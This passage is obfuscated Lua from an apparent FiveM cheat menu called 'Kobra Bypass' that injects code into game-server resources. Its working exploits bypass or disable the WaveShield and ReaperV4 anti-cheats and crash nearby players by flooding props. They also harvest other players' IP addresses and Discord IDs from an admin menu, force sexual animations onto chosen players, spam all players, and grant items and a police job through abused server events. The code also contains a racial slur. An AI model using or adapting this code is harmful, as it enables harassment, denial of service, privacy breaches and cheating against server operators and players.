                            ]]);end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v453=0 + 0 ;local v454;while true do if (v453==(1 + 0)) then if ( #v454==(0 -0)) then local v852=978 -(194 + 784) ;while true do if (v852==0) then v269:Notify("error","Kobra","You must select a player first!",4770 -(694 + 1076) );return;end end end for v797,v798 in ipairs(v454) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v798,v798));end v453=1906 -(122 + 1782) ;end if ((0 + 0)==v453) then v454={};for v799,v800 in pairs(v27) do if v800 then v454[ #v454 + 1 + 0 ]=v799;end end v453=1 + 0 ;end if (v453==2) then v269:Notify("success","Kobra","Attempted to twerk on "   ..  #v454   .. " player(s)." ,2870 + 1130 );break;end end end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v455={};for v565,v566 in pairs(v27) do if v566 then v455[ #v455 + 1 + 0 ]=v565;end end if ( #v455==(1970 -(214 + 1756))) then v269:Notify("error","Kobra","You must select a player first!",14502 -11502 );return;end for v567,v568 in ipairs(v455) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v568,v568));end v269:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v455   .. " player(s)." ,442 + 3558 );end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v456=GetResourceState("WaveShield")=="started" ;local v457=GetResourceState("ReaperV4")=="started" ;if v456 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v457 then MachoInjectThread(0 -0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end end},{type="button",label="Mission Row PD",onSelect=function() local v458=0 + 0 ;local v459;local v460;while true do if (v458==(1 + 0)) then if v459 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v460 then MachoInjectThread(889 -(844 + 45) ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end break;end if (v458==(284 -(242 + 42))) then v459=GetResourceState("WaveShield")=="started" ;v460=GetResourceState("ReaperV4")=="started" ;v458=1 -0 ;end end end},{type="button",label="Pillbox Hospital",onSelect=function() local v461=1200 -(132 + 1068) ;local v462;local v463;while true do if (v461==0) then v462=GetResourceState("WaveShield")=="started" ;v463=GetResourceState("ReaperV4")=="started" ;v461=1;end if (v461==(1 -0)) then if v462 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v463 then MachoInjectThread(1623 -(214 + 1409) ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end break;end end end},{type="button",label="Grove Street",onSelect=function() local v464=GetResourceState("WaveShield")=="started" ;local v465=GetResourceState("ReaperV4")=="started" ;if v464 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v465 then MachoInjectThread(1634 -(497 + 1137) ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end end},{type="button",label="Legion Square",onSelect=function() local v466=GetResourceState("WaveShield")=="started" ;local v467=GetResourceState("ReaperV4")=="started" ;if v466 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v467 then MachoInjectThread(0,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v59("Choose Menu Key","",function(v569) for v619,v620 in pairs(v44) do if (v620:lower()==v569:lower()) then v23=v620;Wait(742 -492 );v12:ShowUI();return;end end end,"keybind");end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1 + 0 ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=1;v15=1266 -(1037 + 228) ;end;local function v96(v270) for v468,v469 in ipairs(v16) do if (v469.label=="Server") then for v730,v731 in ipairs(v469.categories) do if (v731.label=="Triggers") then v731.tabs[ #v731.tabs + 1 ]=v270;return;end end end end end v12.UpdateTabChecked=function(v271,v272,v273,v274) for v470,v471 in pairs(v272 or {} ) do if ((v471.label==v273) and ((v471.type=="checkbox") or (v471.type=="slider-checkbox") or v471.type:find("checkbox"))) then v471.checked=v274;elseif (v471.type=="subMenu") then local v801=0;while true do if (0==v801) then if v471.categories then for v1085,v1086 in pairs(v471.categories) do v271:UpdateTabChecked(v1086.tabs,v273,v274);end end if v471.subTabs then v271:UpdateTabChecked(v471.subTabs,v273,v274);end break;end end end end end;v12.ShowKeybindList=function(v275,v276) v275:SendMessage({action="displayBinds",visible=true,binds=v276});end;v12.HideKeybindList=function(v277) v277:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v278,v279,v280,v281) local v282={};local v283=PlayerPedId();v280=v280 or (566 -216) ;if ( not v283 or  not DoesEntityExist(v283) or  not IsPlayerPlaying(PlayerId())) then v282={};return v282;end local v284=GetActivePlayers();if v284 then for v622,v623 in ipairs(v284) do if (v281 or (v623~=PlayerId())) then local v802=0;local v803;while true do if (v802==(0 -0)) then v803=GetPlayerPed(v623);if (v803 and DoesEntityExist(v803) and IsEntityAPed(v803) and  not IsEntityDead(v803)) then local v1030=0 -0 ;local v1031;while true do if (v1030==(734 -(527 + 207))) then v1031=GetEntityCoords(v803);if v1031 then local v1303=527 -(187 + 340) ;local v1304;while true do if (v1303==(1870 -(1298 + 572))) then v1304= #(v279-v1031);if (v1304<=v280) then v282[ #v282 + 1 ]={name=GetPlayerName(v623),serverId=GetPlayerServerId(v623)};end break;end end end break;end end end break;end end end end else local v570,v571=FindFirstPed();local v572;repeat if (v571 and IsPedAPlayer(v571) and DoesEntityExist(v571)) then local v804=NetworkGetPlayerIndexFromPed(v571);if ((v804~= -(2 -1)) and (v281 or (v804~=PlayerId()))) then local v893=0;local v894;while true do if (v893==(170 -(144 + 26))) then v894=GetEntityCoords(v571);if v894 then local v1171=0 -0 ;local v1172;while true do if ((0 -0)==v1171) then v1172= #(v279-v894);if (v1172<=v280) then v282[ #v282 + 1 ]={name=GetPlayerName(v804),serverId=GetPlayerServerId(v804)};end break;end end end break;end end end end v572,v571=FindNextPed(v570);until  not v572 EndFindPed(v570);end if ( #v282==(0 + 0)) then v282={};end return v282;end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(2725 -1725 );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",6964 -3964 );Wait(4847 -3847 );v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",1524 + 1476 );Wait(1357 -357 );v96({type="button",label="Bypass WaveShield [Risky]",onSelect=function() if (GetResourceState("WaveShield")~="started") then local v624=0 + 0 ;while true do if (v624==(0 + 0)) then v12:Notify("info","Kobra","WaveShield not detected.",3000);return;end end end for v573=1,2 do MachoInjectResource2(3,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v12:Notify("success","Kobra","WaveShield bypass attempted.",3202 -(5 + 197) );end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v96({type="button",label="DeFXAP Events",onSelect=function() v12:HideUI();local v625=nil;local v626=false;v59("Resource Name","",function(v732) if (v732 and (v732~="")) then v625=v732;end v626=true;end,"typeable");while  not v626 do Wait(100);end if ( not v625 or (v625=="")) then local v805=0;while true do if ((687 -(339 + 347))==v805) then return;end if (v805==0) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();v805=1;end end end if (GetResourceState(v625)~="started") then local v806=0;while true do if (v806==(2 -1)) then return;end if (v806==(0 -0)) then MachoMenuNotification("Error","Resource ^3"   .. v625   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v806=1;end end end local v627=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v48(v625,v627);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v625   .. "^7 successfully!" );v12:ShowUI();end});end if (GetResourceState("ox_lib")=="started") then v96({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v628=0;while true do if (0==v628) then if (GetResourceState("WaveShield")=="started") then local v934=0;while true do if (v934==(376 -(365 + 11))) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",2843 + 157 );return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="BRING NEARBY PLAYERS",onSelect=function() v12:Notify("success","Kobra","Attempting to bring all players",11538 -8538 );MachoInjectThread(0 -0 ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);end});end if (GetResourceState("mc9-adminmenu")=="started") then v96({type="button",label="ADMIN MENU (F8)",onSelect=function() local v629=0;while true do if (v629==(924 -(837 + 87))) then v12:Notify("success","Kobra","Admin Menu List",5087 -2087 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v96({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() v12:Notify("success","Kobra","Spawning Items",4670 -(837 + 833) );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);end});end if (GetResourceState("vMenu")=="started") then v96({type="button",label="HIT DMS",onSelect=function() v12:Notify("success","Kobra","Message Sent",3000);MachoInjectResource2(1,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);end});end if (GetResourceState("amigo")=="started") then v96({type="button",label="ADD ITEM (1)",onSelect=function() v12:HideUI();local function v630(v733,v734) local v735=nil;local v736=false;v59(v733,v734 or "" ,function(v807) v735=v807;v736=true;end,"typeable");while  not v736 do Wait(0 + 0 );end return v735;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v631=v630("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v631));if ( not v631 or (v631=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",4387 -(356 + 1031) );v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v632=v630("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v632));local v633=tonumber(v632);if ( not v633 or (v633<1)) then local v808=0 + 0 ;while true do if (v808==0) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v633=1;break;end end end if (v633>100000) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v633=101646 -(73 + 1573) ;end v631=tostring(v631 or "" );v633=tonumber(v633 or (1389 -(1307 + 81)) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v631);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v633);local v634,v635=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v631,v633,v631,v633));end);if  not v634 then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v635);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v631),"itemCount =",tostring(v633));v12:Notify("error","Kobra","String format failed — check console",4000);else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();end});end local v285=GetResourceState("scripts")=="started" ;local v286=GetResourceState("framework")=="started" ;if (v285 or v286) then local v574=234 -(7 + 227) ;local v575;while true do if ((0 -0)==v574) then v575=(v285 and "scripts") or "framework" ;v96({type="button",label="COMPLETE COMMS",onSelect=function() v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",3000);MachoInjectResourceRaw(v575,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v96({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v809=0;while true do if (v809==(166 -(90 + 76))) then v12:Notify("Setjob","Kobra","Your job has been set to police",9412 -6412 );MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
